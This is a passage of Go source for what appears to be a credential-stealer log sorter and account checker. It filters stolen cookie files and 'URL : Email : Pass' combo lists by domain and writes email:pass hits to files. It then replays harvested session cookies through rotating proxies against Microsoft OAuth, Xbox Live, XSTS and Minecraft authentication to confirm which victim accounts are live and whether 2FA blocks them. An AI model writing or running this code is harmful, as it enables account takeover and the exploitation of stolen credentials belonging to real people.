			defer wg.Done()
			defer func() { recover() }()
			for idx := range fileCh {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if err := processOne(idx, files[idx]); err != nil {
					atomic.AddInt64(&errorCount, 1)
					appLog("ERROR processing %s: %v", files[idx], err)
				}
			}
		}()
	}

	// Feed files and send throttled progress
	for idx := range files {
		select {
		case <-ctx.Done():
			break
		case fileCh <- idx:
		}
		if (idx+1)%10 == 0 || idx+1 == totalFiles {
			hits := int(atomic.LoadInt64(&totalHits))
			safeSSEWithContext(ctx, w, flusher, ProgressEvent{
				Type: "progress", Processed: idx + 1, Total: totalFiles,
				Hits: hits, Percent: float64(idx+1) / float64(totalFiles) * 100,
			})
		}
		if (idx+1)%1000 == 0 || idx+1 == totalFiles {
			hits := int(atomic.LoadInt64(&totalHits))
			errs := int(atomic.LoadInt64(&errorCount))
			appLog("RUN PROGRESS - %d/%d files, %d hits, %d errors", idx+1, totalFiles, hits, errs)
		}
	}
	close(fileCh)
	wg.Wait()

	// Deferred directory cleanup
	for d := range dirsToClean {
		for d != dir && d != "." && d != "/" {
			entries, err := os.ReadDir(d)
			if err != nil || len(entries) > 0 {
				break
			}
			if err := os.Remove(d); err != nil {
				break
			}
			d = filepath.Dir(d)
		}
	}

	finalHits := int(atomic.LoadInt64(&totalHits))
	finalCookies := int(atomic.LoadInt64(&totalCookies))
	finalErrors := int(atomic.LoadInt64(&errorCount))

	checked := 0
	valid := 0
	invalid := 0

	if useProxy && len(allFileHits) > 0 {
		var tasks []checkTask
		for _, fh := range allFileHits {
			for domain, cookies := range fh.domains {
				tasks = append(tasks, checkTask{domain, cookies})
			}
		}
		totalChecks := len(tasks)
		if totalChecks > 0 {
			runProxyChecks(ctx, w, flusher, tasks, totalFiles, finalHits, &checked, &valid, &invalid, proxyMode, proxyFile)
		}
	}

	elapsed := time.Since(startTime).Seconds()
	return Summary{
		RunID:           timestamp,
		Timestamp:       now.Format(time.RFC3339),
		FilesScanned:    totalFiles,
		TotalCookies:    finalCookies,
		TotalHits:       finalHits,
		CheckedCookies:  checked,
		ValidCookies:    valid,
		InvalidCookies:  invalid,
		Errors:          finalErrors,
		ElapsedSeconds:  elapsed,
		FiltersUsed:     filters,
		SourceDirectory: dir,
		DomainBreakdown: domainHits,
		OutputDir:       filepath.Join(resDir, "run_"+timestamp),
		ProfilesDir:     profilesDir,
	}, true
}

// processULPLoop sorts txt files containing one "URL : Email : Pass" line each.
// Lines whose URL host matches a filter domain are written as "email:pass"
// lines into a single retard_hits.txt in the run's hits folder.
func processULPLoop(ctx context.Context, w http.ResponseWriter, flusher http.Flusher, filters []string, dir, hitsDir, timestamp string) (Summary, bool) {
	now := time.Now()
	fi := buildFilterIndex(filters)

	var files []string
	filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		files = append(files, path)
		return nil
	})
	sort.Strings(files)

	totalFiles := len(files)
	if totalFiles == 0 {
		return Summary{}, false
	}

	var totalLines int64
	var totalHits int64
	var skippedLines int64
	var errorCount int64
	var hitsMu sync.Mutex
	var hitLines []string
	var skipMu sync.Mutex
	var skipSamples []string
	domainHits := make(map[string]int)
	startTime := time.Now()

	// Track parent dirs for deferred cleanup
	var dirsToCleanMu sync.Mutex
	dirsToClean := make(map[string]struct{})

	processOne := func(idx int, filePath string) (fileErr error) {
		defer func() {
			if rec := recover(); rec != nil {
				appLog("PANIC processing file %s: %v", filePath, rec)
				fileErr = fmt.Errorf("panic: %v", rec)
			}
		}()

		f, err := os.Open(filePath)
		if err != nil {
			return err
		}
		scanner := bufio.NewScanner(f)
		scanner.Buffer(make([]byte, 256*1024), 10*1024*1024)

		var fileCount int64
		var fileSkipped int64
		var fileHits []string
		var fileDomains map[string]int
		for scanner.Scan() {
			rawLine := scanner.Text()
			u, e, p, ok := parseULPLine(rawLine)
			if !ok {
				fileSkipped++
				if len(skipSamples) < 1000 {
					skipMu.Lock()
					if len(skipSamples) < 1000 {
						skipSamples = append(skipSamples, rawLine)
					}
					skipMu.Unlock()
				}
				continue
			}
			fileCount++
			host := hostFromULP(u)
			if host == "" {
				fileSkipped++
				continue
			}
			md := fi.matchDomain(host)
			if md == "" {
				continue
			}
			fileHits = append(fileHits, e+":"+p)
			if fileDomains == nil {
				fileDomains = make(map[string]int)
			}
			fileDomains[md]++
		}
		f.Close()
		if err := scanner.Err(); err != nil {
			return fmt.Errorf("scan error: %w", err)
		}

		atomic.AddInt64(&totalLines, fileCount)
		atomic.AddInt64(&skippedLines, fileSkipped)
		if len(fileHits) > 0 {
			hitsMu.Lock()
			hitLines = append(hitLines, fileHits...)
			for d, c := range fileDomains {
				domainHits[d] += c
			}
			hitsMu.Unlock()
			atomic.AddInt64(&totalHits, int64(len(fileHits)))
		}

		os.Remove(filePath)

		// Track parent dir for deferred cleanup
		parent := filepath.Dir(filePath)
		if parent != dir && parent != "." && parent != "/" {
			dirsToCleanMu.Lock()
			dirsToClean[parent] = struct{}{}
			dirsToCleanMu.Unlock()
		}
		return nil
	}

	// Parallel file processing
	const numWorkers = 16
	fileCh := make(chan int, numWorkers*4)
	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() { recover() }()
			for idx := range fileCh {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if err := processOne(idx, files[idx]); err != nil {
					atomic.AddInt64(&errorCount, 1)
					appLog("ERROR processing %s: %v", files[idx], err)
				}
			}
		}()
	}

	// Feed files and send throttled progress
	for idx := range files {
		select {
		case <-ctx.Done():
			break
		case fileCh <- idx:
		}
		if (idx+1)%10 == 0 || idx+1 == totalFiles {
			hits := int(atomic.LoadInt64(&totalHits))
			safeSSEWithContext(ctx, w, flusher, ProgressEvent{
				Type: "progress", Processed: idx + 1, Total: totalFiles,
				Hits: hits, Percent: float64(idx+1) / float64(totalFiles) * 100,
			})
		}
		if (idx+1)%1000 == 0 || idx+1 == totalFiles {
			hits := int(atomic.LoadInt64(&totalHits))
			errs := int(atomic.LoadInt64(&errorCount))
			appLog("RUN PROGRESS - %d/%d files, %d hits, %d errors", idx+1, totalFiles, hits, errs)
		}
	}
	close(fileCh)
	wg.Wait()

	// Deferred directory cleanup
	for d := range dirsToClean {
		for d != dir && d != "." && d != "/" {
			entries, err := os.ReadDir(d)
			if err != nil || len(entries) > 0 {
				break
			}
			if err := os.Remove(d); err != nil {
				break
			}
			d = filepath.Dir(d)
		}
	}

	finalHits := int(atomic.LoadInt64(&totalHits))
	finalLines := int(atomic.LoadInt64(&totalLines))
	finalSkipped := int(atomic.LoadInt64(&skippedLines))
	finalErrors := int(atomic.LoadInt64(&errorCount))

	if len(hitLines) > 0 {
		var sb strings.Builder
		sb.Grow(len(hitLines) * 48)
		sb.WriteString("# ULP hits (email:pass)\n")
		sb.WriteString(fmt.Sprintf("# Matched: %d lines\n", len(hitLines)))
		sb.WriteString(fmt.Sprintf("# Exported at: %s\n\n", now.Format(time.RFC3339)))
		for _, l := range hitLines {
			sb.WriteString(l)
			sb.WriteString("\n")
		}
		outPath := filepath.Join(hitsDir, "retard_hits.txt")
		if err := os.WriteFile(outPath, []byte(sb.String()), 0644); err != nil {
			appLog("WARN - failed to write ULP hits file %s: %v", outPath, err)
		}
	}

	if finalSkipped > 0 && len(skipSamples) > 0 {
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("# Skipped lines (could not parse as URL : Email : Pass) - total: %d, showing first %d:\n\n", finalSkipped, len(skipSamples)))
		for _, l := range skipSamples {
			sb.WriteString(l)
			sb.WriteString("\n")
		}
		outPath := filepath.Join(hitsDir, "retard_skipped.txt")
		if err := os.WriteFile(outPath, []byte(sb.String()), 0644); err != nil {
			appLog("WARN - failed to write ULP skipped file %s: %v", outPath, err)
		}
	}

	elapsed := time.Since(startTime).Seconds()
	appLog("ULP RUN - files: %d, lines: %d, hits: %d, skipped: %d, errors: %d, time: %.1fs (%.0f lines/s)",
		totalFiles, finalLines, finalHits, finalSkipped, finalErrors, elapsed, float64(finalLines)/elapsed)
	return Summary{
		RunID:           timestamp,
		Timestamp:       now.Format(time.RFC3339),
		FilesScanned:    totalFiles,
		TotalCookies:    finalLines,
		TotalHits:       finalHits,
		UnparsedLines:   finalSkipped,
		Errors:          finalErrors,
		ElapsedSeconds:  elapsed,
		FiltersUsed:     filters,
		SourceDirectory: dir,
		DomainBreakdown: domainHits,
		OutputDir:       filepath.Join(resDir, "run_"+timestamp),
		ProfilesDir:     profilesDir,
	}, true
}

func runProxyChecks(ctx context.Context, w http.ResponseWriter, flusher http.Flusher, tasks []checkTask, totalFiles, totalHits int, checkedOut, validOut, invalidOut *int, proxyMode, proxyFile string) {
	totalChecks := len(tasks)

	safeSSEWithContext(ctx, w, flusher, ProgressEvent{
		Type: "progress", Processed: totalFiles, Total: totalFiles,
		Hits: totalHits, Percent: 100, Checked: 0, CheckTotal: totalChecks, CheckStatus: "loading proxies",
	})

	if proxyFile != "" {
		if err := loadProxies(proxyFile); err != nil {
			safeSSEWithContext(ctx, w, flusher, ProgressEvent{
				Type: "progress", Processed: totalFiles, Total: totalFiles,
				Hits: totalHits, Percent: 100, Checked: 0, CheckTotal: totalChecks, CheckStatus: "proxy load failed: " + err.Error(),
			})
		}
	}

	var completed int64
	var valids int64
	progressDone := make(chan struct{})
	var progressCloseOnce sync.Once

	var progressWG sync.WaitGroup
	progressWG.Add(1)
	go func() {
		defer progressWG.Done()
		defer func() { recover() }()
		ticker := time.NewTicker(200 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-progressDone:
				return
			case <-ticker.C:
				if ctx.Err() != nil {
					return
				}
				c := atomic.LoadInt64(&completed)
				if c == 0 {
					continue
				}
				v := atomic.LoadInt64(&valids)
				pct := float64(0)
				if totalChecks > 0 {
					pct = float64(c) / float64(totalChecks) * 100
				}
				safeSSEWithContext(ctx, w, flusher, ProgressEvent{
					Type: "progress", Processed: totalFiles, Total: totalFiles,
					Hits: totalHits, Percent: pct,
					Checked: int(c), CheckTotal: totalChecks,
					Valid: int(v), Invalid: int(c - v),
					CheckStatus: fmt.Sprintf("checking %d/%d", c, totalChecks),
				})
			case <-ctx.Done():
				return
			}
		}
	}()

	const numWorkers = 20
	taskCh := make(chan checkTask, numWorkers*2)
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() { recover() }()
			for {
				select {
				case <-ctx.Done():
					return
				case task, ok := <-taskCh:
					if !ok {
						return
					}
					var pu string
					proxiesMu.Lock()
					if len(proxies) > 0 {
						pu = buildProxyURL(proxies[rand.Intn(len(proxies))], proxyMode)
					}
					proxiesMu.Unlock()

					if checkDomainCookies(ctx, task.domain, task.cookies, pu) {
						atomic.AddInt64(&valids, 1)
					}
					atomic.AddInt64(&completed, 1)
				}
			}
		}()
	}

feedLoop:
	for _, task := range tasks {
		select {
		case <-ctx.Done():
			break feedLoop
		case taskCh <- task:
		}
	}
	close(taskCh)

	doneCh := make(chan struct{})
	go func() {
		wg.Wait()
		close(doneCh)
	}()

	select {
	case <-doneCh:
	case <-ctx.Done():
	}

	progressCloseOnce.Do(func() { close(progressDone) })
	progressWG.Wait()

	c := atomic.LoadInt64(&completed)
	v := atomic.LoadInt64(&valids)
	*checkedOut = int(c)
	*validOut = int(v)
	*invalidOut = int(c - v)
}

func handleRunProgress(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			appLog("PANIC in handleRunProgress: %v", rec)
			writeSSE(w, ProgressEvent{Type: "error", Message: fmt.Sprintf("internal error: %v", rec)})
		}
	}()

	dir := r.URL.Query().Get("dir")
	if dir == "" {
		http.Error(w, "missing dir parameter", 400)
		return
	}

	cfgMu.RLock()
	filters := make([]string, len(cfg.Filters))
	copy(filters, cfg.Filters)
	proxyMode := cfg.ProxyMode
	proxyFile := cfg.ProxyFile
	sortMode := cfg.SortMode
	if sortMode == "" {
		sortMode = "cookie"
	}
	cfgMu.RUnlock()

	if len(filters) == 0 {
		writeSSE(w, ProgressEvent{Type: "error", Message: "no filters configured"})
		return
	}

	info, err := os.Stat(dir)
	if err != nil || !info.IsDir() {
		writeSSE(w, ProgressEvent{Type: "error", Message: "invalid directory"})
		return
	}

	appLog("RUN START - directory: %s, filters: %d", dir, len(filters))

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	flusher, _ := w.(http.Flusher)

	now := time.Now()
	timestamp := now.Format("20060102_150405")

	profilesRunDir := filepath.Join(profilesDir, "run_"+timestamp)
	resRunDir := filepath.Join(resDir, "run_"+timestamp)
	os.MkdirAll(resRunDir, 0755)

	// Optional flat hits dump: when configured, hits go directly there —
	// no run folder, no summary. Empty = default results/run_<date>/hits.
	resHitsDir := filepath.Join(resRunDir, "hits")
	hitsDir := resHitsDir
	if d := hitsOutputDirSetting(); d != "" {
		os.MkdirAll(d, 0755)
		resHitsDir, hitsDir = d, d
	} else {
		os.MkdirAll(resHitsDir, 0755)
	}

	processDir := dir

	var summary Summary
	var ok bool
	if sortMode == "ulp" {
		appLog("RUN START (ULP) - directory: %s, filters: %d", dir, len(filters))
		summary, ok = processULPLoop(r.Context(), w, flusher, filters, processDir, hitsDir, timestamp)
	} else {
		summary, ok = processFileLoop(r.Context(), w, flusher, filters, processDir, hitsDir, timestamp, proxyMode, proxyFile)
	}

	if !ok {
		if r.Context().Err() != nil {
			appLog("RUN CANCELLED - client disconnected")
			return
		}
		writeSSE(w, ProgressEvent{Type: "error", Message: "no files to process"})
		return
	}

	sumData, _ := json.MarshalIndent(summary, "", "  ")
	os.WriteFile(filepath.Join(resRunDir, "summary.json"), sumData, 0644)
	os.WriteFile(filepath.Join(profilesRunDir, "summary.json"), sumData, 0644)

	appLog("RUN COMPLETE - files: %d, cookies: %d, hits: %d, errors: %d, time: %.1fs",
		summary.FilesScanned, summary.TotalCookies, summary.TotalHits, summary.Errors, summary.ElapsedSeconds)

	cfgMu.Lock()
	cfg.LastRun = summary.RunID
	saveConfig(cfg)
	cfgMu.Unlock()

	if r.Context().Err() != nil {
		appLog("SSE SKIP - client disconnected before completion")
		return
	}

	safeSSE(w, flusher, ProgressEvent{
		Type:            "complete",
		RunID:           summary.RunID,
		FilesScanned:    summary.FilesScanned,
		TotalCookies:    summary.TotalCookies,
		TotalHits:       summary.TotalHits,
		Checked:         summary.CheckedCookies,
		Valid:           summary.ValidCookies,
		Invalid:         summary.InvalidCookies,
		Errors:          summary.Errors,
		ElapsedSeconds:  summary.ElapsedSeconds,
		OutputDir:       summary.OutputDir,
		DomainBreakdown: summary.DomainBreakdown,
	})
}

func handleRunULP(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			appLog("PANIC in handleRunULP: %v", rec)
			writeSSE(w, ProgressEvent{Type: "error", Message: fmt.Sprintf("internal error: %v", rec)})
		}
	}()

	cfgMu.RLock()
	filters := make([]string, len(cfg.Filters))
	copy(filters, cfg.Filters)
	cfgMu.RUnlock()

	if len(filters) == 0 {
		writeSSE(w, ProgressEvent{Type: "error", Message: "no filters configured"})
		return
	}

	if err := r.ParseMultipartForm(64 << 20); err != nil {
		writeSSE(w, ProgressEvent{Type: "error", Message: "failed to parse upload: " + err.Error()})
		return
	}
	if r.MultipartForm == nil || len(r.MultipartForm.File["files"]) == 0 {
		writeSSE(w, ProgressEvent{Type: "error", Message: "no files uploaded"})
		return
	}
	uploads := r.MultipartForm.File["files"]

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	flusher, _ := w.(http.Flusher)

	now := time.Now()
	timestamp := now.Format("20060102_150405")

	profilesRunDir := filepath.Join(profilesDir, "run_"+timestamp)
	resRunDir := filepath.Join(resDir, "run_"+timestamp)
	os.MkdirAll(resRunDir, 0755)

	// Optional flat hits dump (see handleConvertRun).
	resHitsDir := filepath.Join(resRunDir, "hits")
	if d := hitsOutputDirSetting(); d != "" {
		os.MkdirAll(d, 0755)
		resHitsDir = d
	} else {
		os.MkdirAll(resHitsDir, 0755)
	}
	tmpDir := filepath.Join(profilesRunDir, "tmp")
	os.MkdirAll(tmpDir, 0755)

	appLog("RUN START (ULP) - uploaded files: %d, filters: %d", len(uploads), len(filters))

	saved := 0
	for i, fh := range uploads {
		name := filepath.Base(fh.Filename)
		name = strings.ReplaceAll(name, " ", "_")
		if name == "." || name == "" {
			name = fmt.Sprintf("file_%d.txt", i)
		}
		src, err := fh.Open()
		if err != nil {
			continue
		}
		dst := filepath.Join(tmpDir, fmt.Sprintf("%d_%s", i, name))
		out, err := os.Create(dst)
		if err != nil {
			src.Close()
			continue
		}
		_, cerr := io.Copy(out, src)
		src.Close()
		out.Close()
		if cerr == nil {
			saved++
		}
	}
	if saved == 0 {
		os.RemoveAll(tmpDir)
		writeSSE(w, ProgressEvent{Type: "error", Message: "failed to save uploaded files"})
		return
	}

	summary, ok := processULPLoop(r.Context(), w, flusher, filters, tmpDir, resHitsDir, timestamp)
	os.RemoveAll(tmpDir)

	if !ok {
		if r.Context().Err() != nil {
			appLog("RUN CANCELLED - client disconnected")
			return
		}
		writeSSE(w, ProgressEvent{Type: "error", Message: "no files to process"})
		return
	}

	sumData, _ := json.MarshalIndent(summary, "", "  ")
	os.WriteFile(filepath.Join(resRunDir, "summary.json"), sumData, 0644)
	os.WriteFile(filepath.Join(profilesRunDir, "summary.json"), sumData, 0644)

	appLog("RUN COMPLETE (ULP) - files: %d, lines: %d, hits: %d, errors: %d, time: %.1fs",
		summary.FilesScanned, summary.TotalCookies, summary.TotalHits, summary.Errors, summary.ElapsedSeconds)

	cfgMu.Lock()
	cfg.LastRun = summary.RunID
	saveConfig(cfg)
	cfgMu.Unlock()

	if r.Context().Err() != nil {
		appLog("SSE SKIP - client disconnected before completion")
		return
	}

	safeSSE(w, flusher, ProgressEvent{
		Type:            "complete",
		RunID:           summary.RunID,
		FilesScanned:    summary.FilesScanned,
		TotalCookies:    summary.TotalCookies,
		TotalHits:       summary.TotalHits,
		Checked:         summary.CheckedCookies,
		Valid:           summary.ValidCookies,
		Invalid:         summary.InvalidCookies,
		Errors:          summary.Errors,
		ElapsedSeconds:  summary.ElapsedSeconds,
		OutputDir:       summary.OutputDir,
		DomainBreakdown: summary.DomainBreakdown,
		Unparsed:        summary.UnparsedLines,
	})
}

// ============================================================
// ACCOUNT CHECKER - faithful port of rslursorter/checker.py
// (validate_cookies + check_account_with_full_retry, word for
// word in logic: OAuth -> XBL -> XSTS -> Minecraft auth chain)
// ============================================================

func checkerParseCookies(data string) []Cookie {
	var cookies []Cookie
	for _, line := range strings.Split(strings.TrimSpace(data), "\n") {
		parts := strings.Split(line, "\t")
		if len(parts) < 7 {
			continue
		}
		cookies = append(cookies, Cookie{
			RawDomain: parts[0],
			Domain:    strings.TrimLeft(parts[0], "."),
			Flag:      parts[1],
			Path:      parts[2],
			Secure:    parts[3],
			Expiry:    parts[4],
			Name:      parts[5],
			Value:     strings.Join(parts[6:], "\t"),
		})
	}
	return cookies
}

func checkerExtractAccessToken(uri, text string) string {
	if i := strings.Index(uri, "#"); i != -1 {
		for _, part := range strings.Split(uri[i+1:], "&") {
			if strings.HasPrefix(part, "access_token=") {
				if v, err := url.QueryUnescape(part[len("access_token="):]); err == nil {
					return v
				}
			}
		}
	}
	if parsed, err := url.Parse(uri); err == nil && parsed.RawQuery != "" {
		for _, part := range strings.Split(parsed.RawQuery, "&") {
			if strings.HasPrefix(part, "access_token=") {
				if v, err := url.QueryUnescape(part[len("access_token="):]); err == nil {
					return v
				}
			}
			if strings.Contains(part, "access_token%3D") {
				if m := accessTokenURLPattern.FindStringSubmatch(part); m != nil {
					if v, err := url.QueryUnescape(m[1]); err == nil {
						return v
					}
				}
			}
		}
	}
	var data map[string]interface{}
	if json.Unmarshal([]byte(text), &data) == nil {
		if tok, ok := data["access_token"].(string); ok {
			return tok
		}
	}
	for _, re := range accessTokenPatterns {
		if m := re.FindStringSubmatch(text); m != nil {
			if v, err := url.QueryUnescape(m[1]); err == nil {
				return v
			}
		}
	}
	return ""
}

var accessTokenURLPattern = regexp.MustCompile(`access_token%3D([^&%]+)`)

var accessTokenPatterns = []*regexp.Regexp{
	regexp.MustCompile(`access_token["']?\s*[:=]\s*["']?([^&"'\s#<>]+)`),
	regexp.MustCompile(`"access_token":"([^"]+)"`),
	regexp.MustCompile(`access_token=([^&"'\s#<>]+)`),
}

func checkerHTTPClient(proxy string) *http.Client {
	tr := sharedTransport
	if proxy != "" {
		if p, err := url.Parse(proxy); err == nil {
			tr = &http.Transport{
				Proxy:                 http.ProxyURL(p),
				TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
				MaxIdleConns:          10,
				MaxIdleConnsPerHost:   2,
				IdleConnTimeout:       30 * time.Second,
				ResponseHeaderTimeout: 10 * time.Second,
				ExpectContinueTimeout: 1 * time.Second,
			}
		}
	}
	return &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 30 {
				return errors.New("too many redirects")
			}
			return nil
		},
	}
}

func checkerValidateCookies(cookieData, accountName, proxy string, checkMinecraft bool) (success bool, message, username, uuid string, definitive bool) {
	parsed := checkerParseCookies(cookieData)
	client := checkerHTTPClient(proxy)
	if tr, ok := client.Transport.(*http.Transport); ok && client.Transport != sharedTransport {
		defer tr.CloseIdleConnections()
	}

	addCookies := func(req *http.Request) {
		for _, c := range parsed {
			req.AddCookie(&http.Cookie{Name: c.Name, Value: c.Value, Domain: c.Domain, Path: c.Path})
		}
	}
	doGet := func(u string, headers map[string]string) (*http.Response, string, error) {
		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			return nil, "", err
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		addCookies(req)
		resp, err := client.Do(req)
		if err != nil {
			return nil, "", err
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		return resp, string(body), err
	}
	doPostJSON := func(u string, payload map[string]interface{}, headers map[string]string) (*http.Response, map[string]interface{}, error) {
		buf, _ := json.Marshal(payload)
		req, err := http.NewRequest("POST", u, strings.NewReader(string(buf)))
		if err != nil {
			return nil, nil, err
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		req.Header.Set("Content-Type", "application/json")
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		addCookies(req)
		resp, err := client.Do(req)
		if err != nil {
			return nil, nil, err
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return resp, nil, err
		}
		var data map[string]interface{}
		if json.Unmarshal(body, &data) != nil {
			return resp, nil, errors.New("invalid json")
		}
		return resp, data, nil
	}

	// Step 1: OAuth
	oauthURL := "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F&redirect_uri=https://login.live.com/oauth20_desktop.srf&response_type=token&scope=service::user.auth.xboxlive.com::MBI_SSL&prompt=none"
	oauthResp, oauthBody, err := doGet(oauthURL, nil)
	if err != nil {
		return false, "OAuth failed", "", "", false
	}
	accessToken := checkerExtractAccessToken(oauthResp.Request.URL.String(), oauthBody)
	if accessToken == "" {
		lower := strings.ToLower(oauthBody)
		for _, marker := range []string{"identity/confirm", "recover?mkt", "two-step", "send code", "verify your identity", "protected", "keep your account safe", "add security information", "enter the code"} {
			if strings.Contains(lower, marker) {
				return false, "2FA: verification required", "", "", true
			}
		}
		if strings.Contains(lower, "sign in") || strings.Contains(lower, "microsoft account") {
			return false, "INVALID: Expired", "", "", true
		}
		return false, "INVALID: No token", "", "", true
	}

	// Step 2: XBL
	return checkerXboxAuthenticate(accessToken, doPostJSON, doGet, checkMinecraft)
}

// checkerXboxAuthenticate continues the auth flow after an access token has been
// obtained (shared by cookie validation and ULP login): XBL -> XSTS -> Minecraft.
func checkerXboxAuthenticate(accessToken string, doPostJSON func(u string, payload map[string]interface{}, headers map[string]string) (*http.Response, map[string]interface{}, error), doGet func(u string, headers map[string]string) (*http.Response, string, error), checkMinecraft bool) (success bool, message, username, uuid string, definitive bool) {
	// Microsoft-only: a usable OAuth access token proves a live Microsoft login.
	// userinfo (oauth20_userinfo.srf) is authoritative and cheap — it avoids
	// false invalids caused by the streammetrics *Xbox* XSTS step, which hits
	// rate limits or rejects valid accounts on flagged proxy IPs. Only when
	// userinfo is unreachable do we fall through to the full Xbox chain.
	if !checkMinecraft {
		uiResp, uiBody, uiErr := doGet("https://login.live.com/oauth20_userinfo.srf?access_token="+url.QueryEscape(accessToken), nil)
		if uiErr == nil && uiResp.StatusCode == 200 {
			uname := "MicrosoftUser"
			var uiData map[string]interface{}
			if json.Unmarshal([]byte(uiBody), &uiData) == nil {
				if n, ok := uiData["name"].(string); ok && n != "" {
					uname = n
				} else if e, ok := uiData["email"].(string); ok && e != "" {
					uname = e
				}
			}
			return true, "VALID: " + uname, uname, "", true
		}
	}

	xblResp, xblData, err := doPostJSON("https://user.auth.xboxlive.com/user/authenticate", map[string]interface{}{
		"Properties": map[string]interface{}{
			"AuthMethod": "RPS",
			"SiteName":   "user.auth.xboxlive.com",
			"RpsTicket":  accessToken,
		},
		"RelyingParty": "http://auth.xboxlive.com",
		"TokenType":    "JWT",
	}, map[string]string{"Accept": "application/json"})
	if err != nil {
		return false, "XBL failed", "", "", false
	}
	if xblResp.StatusCode != 200 {
		if xblResp.StatusCode == 400 || xblResp.StatusCode == 401 || xblResp.StatusCode == 403 {
			return false, "INVALID: XBL failed", "", "", true
		}
		return false, "XBL error", "", "", false
	}
	xblToken, _ := xblData["Token"].(string)
	if xblToken == "" {
		return false, "INVALID: No XBL token", "", "", true
	}

	// Step 3: XSTS
	xstsResp, xstsData, err := doPostJSON("https://xsts.auth.xboxlive.com/xsts/authorize", map[string]interface{}{
		"Properties": map[string]interface{}{
			"SandboxId":  "RETAIL",
			"UserTokens": []string{xblToken},
		},
		"RelyingParty": "rp://api.minecraftservices.com/",
		"TokenType":    "JWT",
	}, map[string]string{"Accept": "application/json"})
	if err != nil {
		return false, "XSTS failed", "", "", false
	}
	if xstsResp.StatusCode != 200 {
		if xstsResp.StatusCode == 400 || xstsResp.StatusCode == 401 || xstsResp.StatusCode == 403 {
			return false, "INVALID: XSTS failed", "", "", true
		}
		return false, "XSTS error", "", "", false
	}
	xstsToken, _ := xstsData["Token"].(string)
	if xstsToken == "" {
		return false, "INVALID: No XSTS token", "", "", true
	}

	// Get userhash
	userhash := ""
	if claims, ok := xblData["DisplayClaims"].(map[string]interface{}); ok {
		if xui, ok := claims["xui"].([]interface{}); ok && len(xui) > 0 {
			if entry, ok := xui[0].(map[string]interface{}); ok {
				if u, ok := entry["uhs"].(string); ok {
					userhash = u
				}
			}
		}
	}
	if userhash == "" {
		return false, "INVALID: No userhash", "", "", true
	}

	// Step 4: Minecraft Auth
	mcResp, mcData, err := doPostJSON("https://api.minecraftservices.com/authentication/login_with_xbox", map[string]interface{}{
		"identityToken": fmt.Sprintf("XBL3.0 x=%s;%s", userhash, xstsToken),
	}, nil)
	if err != nil {
		return false, "MC auth failed", "", "", false
	}
	if mcResp.StatusCode == 429 {
		return false, "Rate limited", "", "", false
	}
	if mcResp.StatusCode != 200 {
		if mcResp.StatusCode == 400 || mcResp.StatusCode == 401 || mcResp.StatusCode == 403 {
			return false, "INVALID: MC auth failed", "", "", true
		}
		return false, "MC error", "", "", false
	}
	mcToken, _ := mcData["access_token"].(string)
	if mcToken == "" {
		return false, "INVALID: No MC token", "", "", true
	}

	// Step 5: Get profile (only if checking Minecraft)
	if checkMinecraft {
		profileResp, profileBody, err := doGet("https://api.minecraftservices.com/minecraft/profile", map[string]string{"Authorization": "Bearer " + mcToken})
		if err != nil {
			return false, "Profile failed", "", "", false
		}
		if profileResp.StatusCode == 404 {
			return false, "INVALID: No profile", "", "", true
		}
		if profileResp.StatusCode != 200 {
			if profileResp.StatusCode == 400 || profileResp.StatusCode == 401 || profileResp.StatusCode == 403 {
				return false, "INVALID: Profile failed", "", "", true
			}
			return false, "Profile error", "", "", false
		}
		var profileData map[string]interface{}
		if json.Unmarshal([]byte(profileBody), &profileData) != nil {
			return false, "Error", "", "", false
		}
		uname, _ := profileData["name"].(string)
		if uname == "" {
			return false, "INVALID: No name", "", "", true
		}
		uid, _ := profileData["id"].(string)
		return true, "VALID: " + uname, uname, uid, true
	}

	// Microsoft only
	userResp, userBody, err := doGet("https://login.live.com/oauth20_userinfo.srf?access_token="+url.QueryEscape(accessToken), nil)
	if err != nil {
		return true, "VALID: Microsoft", "Microsoft_User", "", true
	}
	if userResp.StatusCode == 200 {
		uname := "Microsoft_User"
		var userData map[string]interface{}
		if json.Unmarshal([]byte(userBody), &userData) == nil {
			if n, ok := userData["name"].(string); ok && n != "" {
				uname = n
			} else if e, ok := userData["email"].(string); ok && e != "" {
				uname = e
			}
		}
		return true, "VALID: " + uname, uname, "", true
	}
	return true, "VALID: Microsoft", "Microsoft_User", "", true
}

func checkerCheckAccountWithFullRetry(cookieData, accountName string, proxyList []string, checkMinecraft bool) (success bool, message, username, uuid string, attempts int) {
	usedProxies := make(map[string]bool)

	for attempt := 0; attempt < 5; attempt++ {
		// Get a proxy we haven't used yet
		var available []string
		for _, p := range proxyList {
			if !usedProxies[p] {
				available = append(available, p)
			}
		}
		if len(available) == 0 {
			break
		}

		proxy := available[rand.Intn(len(available))]
		usedProxies[proxy] = true

